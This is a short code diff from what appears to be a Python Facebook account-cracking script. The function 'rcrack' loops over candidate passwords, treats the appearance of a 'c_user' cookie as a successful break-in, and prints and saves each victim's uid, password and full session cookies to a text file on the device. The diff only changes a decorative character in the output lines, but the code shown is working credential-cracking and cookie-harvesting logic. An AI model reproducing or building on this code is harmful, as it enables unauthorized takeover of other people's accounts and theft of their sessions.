@@ -286,7 +286,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃1;33mCOOKIES┃🍪᚜┃ : \033[38;5;46m'+coki+ ' ')                
+                print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃1;33mCOOKIES┃🍪┃ : \033[38;5;46m'+coki+ ' ')                
                 open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
@@ -300,7 +300,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\33[1;93m[\33┃GS XD-OK\033[0m/%s\33[1;93m᚜┃\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.write('\r\33[1;93m[\33┃GS XD-OK\033[0m/%s\33[1;93m┃\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
